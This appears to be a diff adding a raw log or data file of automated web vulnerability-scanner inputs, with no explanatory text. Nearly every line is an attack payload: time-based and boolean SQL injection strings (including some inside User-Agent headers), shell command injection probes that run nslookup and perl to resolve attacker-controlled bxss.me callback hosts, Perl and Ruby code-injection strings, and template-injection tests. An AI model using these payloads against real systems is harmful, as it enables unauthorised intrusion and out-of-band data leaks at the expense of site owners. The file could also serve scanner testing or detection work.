+2gFnVoht'); waitfor delay '0:0:15' --
+@@FoLd3
+KchSCcl1') OR 155=(SELECT 155 FROM PG_SLEEP(15))--
+KbJTVivu')); waitfor delay '0:0:15' --
+uDvdSsz8')) OR 811=(SELECT 811 FROM PG_SLEEP(15))--
+@@sJXvt
+qDrfx2Qe' OR 849=(SELECT 849 FROM PG_SLEEP(15))--
+@@LSOuF
+WEHNndqs') OR 464=(SELECT 464 FROM PG_SLEEP(15))--
+'.gethostbyname(lc('hitnz'.'mzsdvhoq8822a.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(112).chr(77).chr(108).chr(85).'
+".gethostbyname(lc("hitkn"."gfcgdhii0c76c.bxss.me."))."A".chr(67).chr(hex("58")).chr(116).chr(76).chr(115).chr(81)."
+acRI90RT')) OR 795=(SELECT 795 FROM PG_SLEEP(15))--
+@@bi09p
+" "A".concat(70-3).concat(22*4).concat(106).concat(76).concat(115).concat(81) (require"socket" Socket.gethostbyname("hitjo" "peyqyyyh51d80.bxss.me.")[3].to_s) "
+' 'A'.concat(70-3).concat(22*4).concat(106).concat(84).concat(117).concat(71) (require'socket' Socket.gethostbyname('hitjb' 'ydntnkph4935c.bxss.me.')[3].to_s) '
+1BpVEZanBnO
+1CEfZ5Vm2IO
+1B76kmYRNNO
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4083.0 Safari/537.36
+YnLlSkEr
+-1 OR 2 687-687-1=0 0 0 1 --
+-1 OR 2 24-24-1=0 0 0 1
+-1' OR 2 67-67-1=0 0 0 1 --
+-1' OR 2 626-626-1=0 0 0 1 or 'ga2pTsOR'='
+Mozilla/5.0 (Linux; Android 8.1.0; Lenovo TB-X304L Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.101 Safari/537.36 GSA/12.23.16.23.arm64
+-1" OR 2 751-751-1=0 0 0 1 --
+EPEI0ARX
+-1 OR 2 92-92-1=0 0 0 1 --
+-1 OR 2 656-656-1=0 0 0 1
+-1' OR 2 409-409-1=0 0 0 1 --
+-1' OR 2 598-598-1=0 0 0 1 or 'OCJCE3X7'='
+Rttntzkm
+-1" OR 2 598-598-1=0 0 0 1 --
+-1 OR 2 869-869-1=0 0 0 1 --
+-1 OR 2 423-423-1=0 0 0 1
+-1' OR 2 148-148-1=0 0 0 1 --
+-1' OR 2 887-887-1=0 0 0 1 or 'cjOT330M'='
+-1" OR 2 192-192-1=0 0 0 1 --
+1BaYLdz3X6O
+zYZEtvUq'; waitfor delay '0:0:15' --
+zd40gLRI'); waitfor delay '0:0:15' --
+LmC09Mqd'; waitfor delay '0:0:15' --
+echo rhbmxy$()\ rpcuvv\nz^xyu||a #' &echo rhbmxy$()\ rpcuvv\nz^xyu||a #|" &echo rhbmxy$()\ rpcuvv\nz^xyu||a #
+&echo ioteoi$()\ phnddx\nz^xyu||a #' &echo ioteoi$()\ phnddx\nz^xyu||a #|" &echo ioteoi$()\ phnddx\nz^xyu||a #
+|echo qlrcee$()\ tnlmgs\nz^xyu||a #' |echo qlrcee$()\ tnlmgs\nz^xyu||a #|" |echo qlrcee$()\ tnlmgs\nz^xyu||a #
+aYoOCpVA')); waitfor delay '0:0:15' --
+(nslookup hitjfyoaaqzckd9e67.bxss.me||perl -e "gethostbyname('hitjfyoaaqzckd9e67.bxss.me')")
+$(nslookup hitlohcdllhjh809c8.bxss.me||perl -e "gethostbyname('hitlohcdllhjh809c8.bxss.me')")
+uFlaJ9EC'; waitfor delay '0:0:15' --
+&(nslookup hitbvctyriliydec94.bxss.me||perl -e "gethostbyname('hitbvctyriliydec94.bxss.me')")&'\"`0&(nslookup hitbvctyriliydec94.bxss.me||perl -e "gethostbyname('hitbvctyriliydec94.bxss.me')")&`'
+fefTzMTt'); waitfor delay '0:0:15' --
+|(nslookup hitgglocpnxvab8797.bxss.me||perl -e "gethostbyname('hitgglocpnxvab8797.bxss.me')")
+`(nslookup hitramwkwtnua71960.bxss.me||perl -e "gethostbyname('hitramwkwtnua71960.bxss.me')")`
+;(nslookup hitbrscpzfeyt7ac09.bxss.me||perl -e "gethostbyname('hitbrscpzfeyt7ac09.bxss.me')")|(nslookup hitbrscpzfeyt7ac09.bxss.me||perl -e "gethostbyname('hitbrscpzfeyt7ac09.bxss.me')")&(nslookup hitbrscpzfeyt7ac09.bxss.me||perl -e "gethostbyname('hitbrscpzfeyt7ac09.bxss.me')")
+5FjKpQHr' OR 735=(SELECT 735 FROM PG_SLEEP(15))--
+L4IAkkzg'); waitfor delay '0:0:15' --
+yA2jH7Sr')); waitfor delay '0:0:15' --
+HdNavXlD') OR 21=(SELECT 21 FROM PG_SLEEP(15))--
+QUk9RCWQ')); waitfor delay '0:0:15' --
+WnfRV74l' OR 111=(SELECT 111 FROM PG_SLEEP(15))--
+PDFNiCJ9')) OR 558=(SELECT 558 FROM PG_SLEEP(15))--
+${9999770 10000025}
+qmV7t33X' OR 937=(SELECT 937 FROM PG_SLEEP(15))--
+YtzuPSWe') OR 765=(SELECT 765 FROM PG_SLEEP(15))--
+yXjp30RI') OR 942=(SELECT 942 FROM PG_SLEEP(15))--
+@@Ik6sK
+kRzchQhO')) OR 103=(SELECT 103 FROM PG_SLEEP(15))--
+XFT18OJ9')) OR 386=(SELECT 386 FROM PG_SLEEP(15))--
+@@pXUUP
+@@PCrBN
+'.gethostbyname(lc('hitrp'.'rcqangoc60207.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(107).chr(81).chr(102).chr(71).'
+".gethostbyname(lc("hitlm"."kylmnzhw827e3.bxss.me."))."A".chr(67).chr(hex("58")).chr(121).chr(89).chr(104).chr(69)."
+" "A".concat(70-3).concat(22*4).concat(116).concat(84).concat(114).concat(72) (require"socket" Socket.gethostbyname("hitol" "xezbixdw95b65.bxss.me.")[3].to_s) "
+' 'A'.concat(70-3).concat(22*4).concat(100).concat(82).concat(113).concat(87) (require'socket' Socket.gethostbyname('hitvm' 'gltznspv86ba7.bxss.me.')[3].to_s) '
+echo veamdj$()\ vfcayg\nz^xyu||a #' &echo veamdj$()\ vfcayg\nz^xyu||a #|" &echo veamdj$()\ vfcayg\nz^xyu||a #
+&echo qytzpw$()\ bgtzdk\nz^xyu||a #' &echo qytzpw$()\ bgtzdk\nz^xyu||a #|" &echo qytzpw$()\ bgtzdk\nz^xyu||a #
+|echo wcyzst$()\ qsaefv\nz^xyu||a #' |echo wcyzst$()\ qsaefv\nz^xyu||a #|" |echo wcyzst$()\ qsaefv\nz^xyu||a #
+(nslookup hitqloyiiuwfx8b847.bxss.me||perl -e "gethostbyname('hitqloyiiuwfx8b847.bxss.me')")
+$(nslookup hitmixdnpxxtza3d9f.bxss.me||perl -e "gethostbyname('hitmixdnpxxtza3d9f.bxss.me')")
+&(nslookup hitbofocfrjqbadc5a.bxss.me||perl -e "gethostbyname('hitbofocfrjqbadc5a.bxss.me')")&'\"`0&(nslookup hitbofocfrjqbadc5a.bxss.me||perl -e "gethostbyname('hitbofocfrjqbadc5a.bxss.me')")&`'
+|(nslookup hithzlpsiqksf428be.bxss.me||perl -e "gethostbyname('hithzlpsiqksf428be.bxss.me')")
+`(nslookup hittusxxubxls3a748.bxss.me||perl -e "gethostbyname('hittusxxubxls3a748.bxss.me')")`
+;(nslookup hitmtpkofqtxo02d45.bxss.me||perl -e "gethostbyname('hitmtpkofqtxo02d45.bxss.me')")|(nslookup hitmtpkofqtxo02d45.bxss.me||perl -e "gethostbyname('hitmtpkofqtxo02d45.bxss.me')")&(nslookup hitmtpkofqtxo02d45.bxss.me||perl -e "gethostbyname('hitmtpkofqtxo02d45.bxss.me')")
+${9999294 9999780}
+'.gethostbyname(lc('hitqj'.'disldeuz75e14.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(102).chr(74).chr(115).chr(68).'
+".gethostbyname(lc("hitzd"."rdyhzqwp4c926.bxss.me."))."A".chr(67).chr(hex("58")).chr(120).chr(71).chr(97).chr(79)."
+" "A".concat(70-3).concat(22*4).concat(103).concat(90).concat(103).concat(75) (require"socket" Socket.gethostbyname("hityh" "zmdzfusu75f63.bxss.me.")[3].to_s) "
+' 'A'.concat(70-3).concat(22*4).concat(100).concat(87).concat(111).concat(73) (require'socket' Socket.gethostbyname('hittf' 'jtalczxhbcafd.bxss.me.')[3].to_s) '
+echo higomv$()\ hrtehm\nz^xyu||a #' &echo higomv$()\ hrtehm\nz^xyu||a #|" &echo higomv$()\ hrtehm\nz^xyu||a #
+&echo cbzsbb$()\ ekgkde\nz^xyu||a #' &echo cbzsbb$()\ ekgkde\nz^xyu||a #|" &echo cbzsbb$()\ ekgkde\nz^xyu||a #
+${9999551 9999946}
+|echo idiqte$()\ rddjal\nz^xyu||a #' |echo idiqte$()\ rddjal\nz^xyu||a #|" |echo idiqte$()\ rddjal\nz^xyu||a #
+(nslookup hitrojxyxzahv014ac.bxss.me||perl -e "gethostbyname('hitrojxyxzahv014ac.bxss.me')")
+$(nslookup hitrffmuubxfj74953.bxss.me||perl -e "gethostbyname('hitrffmuubxfj74953.bxss.me')")
+&(nslookup hitnavulfrady77acf.bxss.me||perl -e "gethostbyname('hitnavulfrady77acf.bxss.me')")&'\"`0&(nslookup hitnavulfrady77acf.bxss.me||perl -e "gethostbyname('hitnavulfrady77acf.bxss.me')")&`'
+|(nslookup hitmfaadhjkgtc9eaa.bxss.me||perl -e "gethostbyname('hitmfaadhjkgtc9eaa.bxss.me')")
+`(nslookup hitgnuerrmneie5347.bxss.me||perl -e "gethostbyname('hitgnuerrmneie5347.bxss.me')")`
+;(nslookup hituoezgedvnoc75de.bxss.me||perl -e "gethostbyname('hituoezgedvnoc75de.bxss.me')")|(nslookup hituoezgedvnoc75de.bxss.me||perl -e "gethostbyname('hituoezgedvnoc75de.bxss.me')")&(nslookup hituoezgedvnoc75de.bxss.me||perl -e "gethostbyname('hituoezgedvnoc75de.bxss.me')")
+'.gethostbyname(lc('hitrn'.'gasztcql53420.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(104).chr(89).chr(100).chr(72).'
+".gethostbyname(lc("hitld"."walzklsh7e166.bxss.me."))."A".chr(67).chr(hex("58")).chr(104).chr(86).chr(104).chr(72)."
+" "A".concat(70-3).concat(22*4).concat(108).concat(67).concat(122).concat(76) (require"socket" Socket.gethostbyname("hitfe" "ctczapwpabd8f.bxss.me.")[3].to_s) "
+' 'A'.concat(70-3).concat(22*4).concat(117).concat(82).concat(114).concat(69) (require'socket' Socket.gethostbyname('hitzq' 'indcnzrb43b32.bxss.me.')[3].to_s) '
+${9999645 9999700}
+echo mrdmqf$()\ uxtypf\nz^xyu||a #' &echo mrdmqf$()\ uxtypf\nz^xyu||a #|" &echo mrdmqf$()\ uxtypf\nz^xyu||a #
+&echo eeadsq$()\ rkxkox\nz^xyu||a #' &echo eeadsq$()\ rkxkox\nz^xyu||a #|" &echo eeadsq$()\ rkxkox\nz^xyu||a #
+|echo cwltin$()\ ojmyvc\nz^xyu||a #' |echo cwltin$()\ ojmyvc\nz^xyu||a #|" |echo cwltin$()\ ojmyvc\nz^xyu||a #
+(nslookup hitbkkkwfxtze768b9.bxss.me||perl -e "gethostbyname('hitbkkkwfxtze768b9.bxss.me')")
+$(nslookup hitxsieqiixdr6fb01.bxss.me||perl -e "gethostbyname('hitxsieqiixdr6fb01.bxss.me')")
+&(nslookup hitnjbgfpepne1b70f.bxss.me||perl -e "gethostbyname('hitnjbgfpepne1b70f.bxss.me')")&'\"`0&(nslookup hitnjbgfpepne1b70f.bxss.me||perl -e "gethostbyname('hitnjbgfpepne1b70f.bxss.me')")&`'
+'.gethostbyname(lc('hitit'.'ymheagkj38d9c.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(116).chr(71).chr(115).chr(88).'
+|(nslookup hitfhsbefhaam08e21.bxss.me||perl -e "gethostbyname('hitfhsbefhaam08e21.bxss.me')")
+".gethostbyname(lc("hitkg"."vkuijllqe9438.bxss.me."))."A".chr(67).chr(hex("58")).chr(118).chr(71).chr(113).chr(89)."
+`(nslookup hithupeuiyycv05806.bxss.me||perl -e "gethostbyname('hithupeuiyycv05806.bxss.me')")`
+;(nslookup hitlzciwywelm651af.bxss.me||perl -e "gethostbyname('hitlzciwywelm651af.bxss.me')")|(nslookup hitlzciwywelm651af.bxss.me||perl -e "gethostbyname('hitlzciwywelm651af.bxss.me')")&(nslookup hitlzciwywelm651af.bxss.me||perl -e "gethostbyname('hitlzciwywelm651af.bxss.me')")
+" "A".concat(70-3).concat(22*4).concat(117).concat(80).concat(103).concat(86) (require"socket" Socket.gethostbyname("hitar" "drafxqjx7b8c0.bxss.me.")[3].to_s) "
+' 'A'.concat(70-3).concat(22*4).concat(104).concat(76).concat(118).concat(90) (require'socket' Socket.gethostbyname('hitgf' 'vdtcxxiw12031.bxss.me.')[3].to_s) '
+1Dt0MbzfSpO
+18iNeQaz4O
+1CSALLMfx4O
+echo fdipxo$()\ yybvfu\nz^xyu||a #' &echo fdipxo$()\ yybvfu\nz^xyu||a #|" &echo fdipxo$()\ yybvfu\nz^xyu||a #
+&echo kvntcl$()\ gxvugc\nz^xyu||a #' &echo kvntcl$()\ gxvugc\nz^xyu||a #|" &echo kvntcl$()\ gxvugc\nz^xyu||a #
+|echo tblyss$()\ cgygms\nz^xyu||a #' |echo tblyss$()\ cgygms\nz^xyu||a #|" |echo tblyss$()\ cgygms\nz^xyu||a #
+(nslookup hitiqmsdisdpw96137.bxss.me||perl -e "gethostbyname('hitiqmsdisdpw96137.bxss.me')")
+$(nslookup hitumkbbsffkl4c816.bxss.me||perl -e "gethostbyname('hitumkbbsffkl4c816.bxss.me')")
+&(nslookup hitkemmmuqsenf169a.bxss.me||perl -e "gethostbyname('hitkemmmuqsenf169a.bxss.me')")&'\"`0&(nslookup hitkemmmuqsenf169a.bxss.me||perl -e "gethostbyname('hitkemmmuqsenf169a.bxss.me')")&`'
+|(nslookup hitskqqgmzekt121ea.bxss.me||perl -e "gethostbyname('hitskqqgmzekt121ea.bxss.me')")
+${9999674 9999798}
+`(nslookup hitjivsrsqarf544b8.bxss.me||perl -e "gethostbyname('hitjivsrsqarf544b8.bxss.me')")`
+;(nslookup hitvxzeeeohuc9a9e1.bxss.me||perl -e "gethostbyname('hitvxzeeeohuc9a9e1.bxss.me')")|(nslookup hitvxzeeeohuc9a9e1.bxss.me||perl -e "gethostbyname('hitvxzeeeohuc9a9e1.bxss.me')")&(nslookup hitvxzeeeohuc9a9e1.bxss.me||perl -e "gethostbyname('hitvxzeeeohuc9a9e1.bxss.me')")
+'.gethostbyname(lc('hiteh'.'eqltxlok9251c.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(111).chr(85).chr(103).chr(90).'
+".gethostbyname(lc("hitrp"."nranktrr42e1d.bxss.me."))."A".chr(67).chr(hex("58")).chr(121).chr(74).chr(103).chr(70)."
+" "A".concat(70-3).concat(22*4).concat(117).concat(87).concat(113).concat(67) (require"socket" Socket.gethostbyname("hitah" "ncegwlpjd5c1e.bxss.me.")[3].to_s) "
+' 'A'.concat(70-3).concat(22*4).concat(103).concat(74).concat(116).concat(82) (require'socket' Socket.gethostbyname('hitcd' 'jhwhyedi3152f.bxss.me.')[3].to_s) '
+echo vgdccv$()\ jkooqt\nz^xyu||a #' &echo vgdccv$()\ jkooqt\nz^xyu||a #|" &echo vgdccv$()\ jkooqt\nz^xyu||a #
+${9999154 9999680}
+&echo bxcyjx$()\ qodalv\nz^xyu||a #' &echo bxcyjx$()\ qodalv\nz^xyu||a #|" &echo bxcyjx$()\ qodalv\nz^xyu||a #
+|echo wbikao$()\ uqxdli\nz^xyu||a #' |echo wbikao$()\ uqxdli\nz^xyu||a #|" |echo wbikao$()\ uqxdli\nz^xyu||a #
+(nslookup hitarkousosdv3ce23.bxss.me||perl -e "gethostbyname('hitarkousosdv3ce23.bxss.me')")
+$(nslookup hiticpfwymauy1d08d.bxss.me||perl -e "gethostbyname('hiticpfwymauy1d08d.bxss.me')")
+&(nslookup hitmcdjhjigrn4e280.bxss.me||perl -e "gethostbyname('hitmcdjhjigrn4e280.bxss.me')")&'\"`0&(nslookup hitmcdjhjigrn4e280.bxss.me||perl -e "gethostbyname('hitmcdjhjigrn4e280.bxss.me')")&`'
+|(nslookup hitlujtxwyhapd18e2.bxss.me||perl -e "gethostbyname('hitlujtxwyhapd18e2.bxss.me')")
+`(nslookup hitlnzgyubwqcd1b6b.bxss.me||perl -e "gethostbyname('hitlnzgyubwqcd1b6b.bxss.me')")`
+'.gethostbyname(lc('hitav'.'rmnjmbew06b40.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(105).chr(69).chr(99).chr(71).'
+;(nslookup hitngmcjmokpl58a0d.bxss.me||perl -e "gethostbyname('hitngmcjmokpl58a0d.bxss.me')")|(nslookup hitngmcjmokpl58a0d.bxss.me||perl -e "gethostbyname('hitngmcjmokpl58a0d.bxss.me')")&(nslookup hitngmcjmokpl58a0d.bxss.me||perl -e "gethostbyname('hitngmcjmokpl58a0d.bxss.me')")
+".gethostbyname(lc("hitrq"."ffwlodrkeea68.bxss.me."))."A".chr(67).chr(hex("58")).chr(98).chr(82).chr(104).chr(75)."
+-1 OR 2 129-129-1=0 0 0 1 --
+-1 OR 3 129-129-1=0 0 0 1 --
+-1 OR 2 221-221-1=0 0 0 1
+ZScQm0a2
+-1' OR 2 313-313-1=0 0 0 1 --
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36' AND 2*3*8=6*8 AND 'tr5v'='tr5v
+-1' OR 3 313-313-1=0 0 0 1 --
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36' AND 2*3*8=6*9 AND 'tr5v'='tr5v
+-1' OR 2 408-408-1=0 0 0 1 or 'a4qhxzLh'='
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36" AND 2*3*8=6*8 AND "wrPn"="wrPn
+-1' OR 3 408-408-1=0 0 0 1 or 'a4qhxzLh'='
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36" AND 2*3*8=6*9 AND "wrPn"="wrPn
+" "A".concat(70-3).concat(22*4).concat(119).concat(84).concat(121).concat(89) (require"socket" Socket.gethostbyname("hitkf" "ymikrdxxb67ac.bxss.me.")[3].to_s) "
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36%' AND 2*3*8=6*8 AND 'ZxsL'!='ZxsL%
+-1" OR 2 715-715-1=0 0 0 1 --
+' 'A'.concat(70-3).concat(22*4).concat(107).concat(80).concat(109).concat(70) (require'socket' Socket.gethostbyname('hitvc' 'obcawqppb7597.bxss.me.')[3].to_s) '
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36%' AND 2*3*8=6*9 AND 'ZxsL'!='ZxsL%
+5qCJhFi7
+-1" OR 3 715-715-1=0 0 0 1 --
+-1 OR 2 591-591-1=0 0 0 1
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36' AND 2*3*8=6*8 AND 'vKFX'='vKFX
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36' RLIKE (SELECT (CASE WHEN (299=299) THEN 1 ELSE 0x28 END)) --
+qfvr5jjW
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36' AND 2*3*8=6*9 AND 'vKFX'='vKFX
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36' RLIKE (SELECT (CASE WHEN (299=0*299) THEN 1 ELSE 0x28 END)) --
+-1 OR 2 265-265-1=0 0 0 1 --
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36" AND 2*3*8=6*8 AND "AwqX"="AwqX
+-1 OR 2 566-566-1=0 0 0 1
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36" AND 2*3*8=6*9 AND "AwqX"="AwqX
+-1' OR 2 866-866-1=0 0 0 1 --
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36%' AND 2*3*8=6*8 AND 'Bpq5'!='Bpq5%
+-1' OR 2 769-769-1=0 0 0 1 or 'eBTf8i9n'='
+-1 OR 2 33-33-1=0 0 0 1
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36' RLIKE (SELECT (CASE WHEN (491=491) THEN 1 ELSE 0x28 END)) --
+-1" OR 2 742-742-1=0 0 0 1 --
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36' RLIKE (SELECT (CASE WHEN (491=0*491) THEN 1 ELSE 0x28 END)) --
+echo ckdgkl$()\ sshduh\nz^xyu||a #' &echo ckdgkl$()\ sshduh\nz^xyu||a #|" &echo ckdgkl$()\ sshduh\nz^xyu||a #
+&echo fvyaml$()\ drplfv\nz^xyu||a #' &echo fvyaml$()\ drplfv\nz^xyu||a #|" &echo fvyaml$()\ drplfv\nz^xyu||a #
+|echo gbqrrt$()\ lcaqor\nz^xyu||a #' |echo gbqrrt$()\ lcaqor\nz^xyu||a #|" |echo gbqrrt$()\ lcaqor\nz^xyu||a #
+${9999533 9999803}
+(nslookup hitfqlpvnjiii2910b.bxss.me||perl -e "gethostbyname('hitfqlpvnjiii2910b.bxss.me')")
+$(nslookup hitfpkbcvdtvxab7a4.bxss.me||perl -e "gethostbyname('hitfpkbcvdtvxab7a4.bxss.me')")
+&(nslookup hitxfwccsllmsc1d3f.bxss.me||perl -e "gethostbyname('hitxfwccsllmsc1d3f.bxss.me')")&'\"`0&(nslookup hitxfwccsllmsc1d3f.bxss.me||perl -e "gethostbyname('hitxfwccsllmsc1d3f.bxss.me')")&`'
+|(nslookup hitermrfkskqi79b76.bxss.me||perl -e "gethostbyname('hitermrfkskqi79b76.bxss.me')")
+`(nslookup hitgupfizqdum9b490.bxss.me||perl -e "gethostbyname('hitgupfizqdum9b490.bxss.me')")`
+;(nslookup hithrsdwupran50e0a.bxss.me||perl -e "gethostbyname('hithrsdwupran50e0a.bxss.me')")|(nslookup hithrsdwupran50e0a.bxss.me||perl -e "gethostbyname('hithrsdwupran50e0a.bxss.me')")&(nslookup hithrsdwupran50e0a.bxss.me||perl -e "gethostbyname('hithrsdwupran50e0a.bxss.me')")
+'.gethostbyname(lc('hitxs'.'ammtlrgqce5e1.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(99).chr(88).chr(107).chr(80).'
+".gethostbyname(lc("hitrw"."xgozdhgb2912c.bxss.me."))."A".chr(67).chr(hex("58")).chr(99).chr(84).chr(98).chr(75)."
+ffNrsCIw'; waitfor delay '0:0:15' --
+Rudz1xqo'; waitfor delay '0:0:15' --
+h8JfzXbc'); waitfor delay '0:0:15' --
+F2ZSoDNR'; waitfor delay '0:0:15' --
+cWatymgb'); waitfor delay '0:0:15' --
+F7MQpfi2')); waitfor delay '0:0:15' --
+ZxhS0GMj'; waitfor delay '0:0:15' --
+k9m9A32w'); waitfor delay '0:0:15' --
+" "A".concat(70-3).concat(22*4).concat(98).concat(86).concat(101).concat(72) (require"socket" Socket.gethostbyname("hitge" "nkoblaqq50176.bxss.me.")[3].to_s) "
+tai8YGGf')); waitfor delay '0:0:15' --
+' 'A'.concat(70-3).concat(22*4).concat(102).concat(80).concat(115).concat(82) (require'socket' Socket.gethostbyname('hithx' 'vdlajvfb65d7a.bxss.me.')[3].to_s) '
+O1JlviuA' OR 397=(SELECT 397 FROM PG_SLEEP(15))--
+wGts5fQC'); waitfor delay '0:0:15' --
+hM60oSoP')); waitfor delay '0:0:15' --
+dSiS4op7' OR 822=(SELECT 822 FROM PG_SLEEP(15))--
+Lu0b6yCS') OR 964=(SELECT 964 FROM PG_SLEEP(15))--
+1DavpEmXCSO
+vbh2ezP6')); waitfor delay '0:0:15' --
+KvXBocy4' OR 169=(SELECT 169 FROM PG_SLEEP(15))--
+1ZXKQQ6kiO
+s4nW2pKg') OR 342=(SELECT 342 FROM PG_SLEEP(15))--
+WDZcsGyq')) OR 996=(SELECT 996 FROM PG_SLEEP(15))--
+1BZh4gD828O
+j6OUEcKm' OR 711=(SELECT 711 FROM PG_SLEEP(15))--
+AasmgYua') OR 307=(SELECT 307 FROM PG_SLEEP(15))--
+15Q4qFsEpO
+cmk0LNEC')) OR 73=(SELECT 73 FROM PG_SLEEP(15))--
+@@5Z4Bd
+RzsEZyfC') OR 369=(SELECT 369 FROM PG_SLEEP(15))--
+zxszlUUK')) OR 169=(SELECT 169 FROM PG_SLEEP(15))--
+kELZyQ3p')) OR 350=(SELECT 350 FROM PG_SLEEP(15))--
+echo atxhto$()\ vdprho\nz^xyu||a #' &echo atxhto$()\ vdprho\nz^xyu||a #|" &echo atxhto$()\ vdprho\nz^xyu||a #
+@@QHO8y
+&echo jgxygr$()\ dthhod\nz^xyu||a #' &echo jgxygr$()\ dthhod\nz^xyu||a #|" &echo jgxygr$()\ dthhod\nz^xyu||a #
+|echo ozoyaj$()\ vnwwyg\nz^xyu||a #' |echo ozoyaj$()\ vnwwyg\nz^xyu||a #|" |echo ozoyaj$()\ vnwwyg\nz^xyu||a #
+(nslookup hittfdytcejyl2f263.bxss.me||perl -e "gethostbyname('hittfdytcejyl2f263.bxss.me')")
+@@89sGU
+$(nslookup hitximczvpwev806d6.bxss.me||perl -e "gethostbyname('hitximczvpwev806d6.bxss.me')")
+&(nslookup hitqyxkhzzjui42ef5.bxss.me||perl -e "gethostbyname('hitqyxkhzzjui42ef5.bxss.me')")&'\"`0&(nslookup hitqyxkhzzjui42ef5.bxss.me||perl -e "gethostbyname('hitqyxkhzzjui42ef5.bxss.me')")&`'
+|(nslookup hitfvqkwhycjfa62a9.bxss.me||perl -e "gethostbyname('hitfvqkwhycjfa62a9.bxss.me')")
+`(nslookup hitcptjfvtluo71080.bxss.me||perl -e "gethostbyname('hitcptjfvtluo71080.bxss.me')")`
+;(nslookup hitdusrvfhvtx25ea4.bxss.me||perl -e "gethostbyname('hitdusrvfhvtx25ea4.bxss.me')")|(nslookup hitdusrvfhvtx25ea4.bxss.me||perl -e "gethostbyname('hitdusrvfhvtx25ea4.bxss.me')")&(nslookup hitdusrvfhvtx25ea4.bxss.me||perl -e "gethostbyname('hitdusrvfhvtx25ea4.bxss.me')")
+@@pbifB
+${9999945 10000360}
+'.gethostbyname(lc('hitqd'.'lwdgdnfg76e49.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(120).chr(84).chr(108).chr(75).'
+".gethostbyname(lc("hitif"."gtivugjl5e914.bxss.me."))."A".chr(67).chr(hex("58")).chr(119).chr(74).chr(118).chr(72)."
+" "A".concat(70-3).concat(22*4).concat(104).concat(84).concat(114).concat(78) (require"socket" Socket.gethostbyname("hitja" "fwrzlxdk5f9de.bxss.me.")[3].to_s) "
+' 'A'.concat(70-3).concat(22*4).concat(109).concat(66).concat(106).concat(66) (require'socket' Socket.gethostbyname('hitfz' 'pbysdhzocb9e0.bxss.me.')[3].to_s) '
+echo wvrokg$()\ mnloyw\nz^xyu||a #' &echo wvrokg$()\ mnloyw\nz^xyu||a #|" &echo wvrokg$()\ mnloyw\nz^xyu||a #
+&echo zqdqip$()\ ejmqoe\nz^xyu||a #' &echo zqdqip$()\ ejmqoe\nz^xyu||a #|" &echo zqdqip$()\ ejmqoe\nz^xyu||a #
+|echo flieio$()\ oxbkdl\nz^xyu||a #' |echo flieio$()\ oxbkdl\nz^xyu||a #|" |echo flieio$()\ oxbkdl\nz^xyu||a #
+elapo1kt
+(nslookup hitnqoyjnmrdn05e33.bxss.me||perl -e "gethostbyname('hitnqoyjnmrdn05e33.bxss.me')")
+$(nslookup hittfvqwtvzvjf1899.bxss.me||perl -e "gethostbyname('hittfvqwtvzvjf1899.bxss.me')")
+-1 OR 2 790-790-1=0 0 0 1 --
+&(nslookup hituazujitolb77a08.bxss.me||perl -e "gethostbyname('hituazujitolb77a08.bxss.me')")&'\"`0&(nslookup hituazujitolb77a08.bxss.me||perl -e "gethostbyname('hituazujitolb77a08.bxss.me')")&`'
+-1 OR 2 426-426-1=0 0 0 1
+|(nslookup hitmbosgcacks8e683.bxss.me||perl -e "gethostbyname('hitmbosgcacks8e683.bxss.me')")
+-1' OR 2 853-853-1=0 0 0 1 --
+`(nslookup hitjttqmtmrwbda85a.bxss.me||perl -e "gethostbyname('hitjttqmtmrwbda85a.bxss.me')")`
+-1' OR 2 565-565-1=0 0 0 1 or 'nopD5UyQ'='
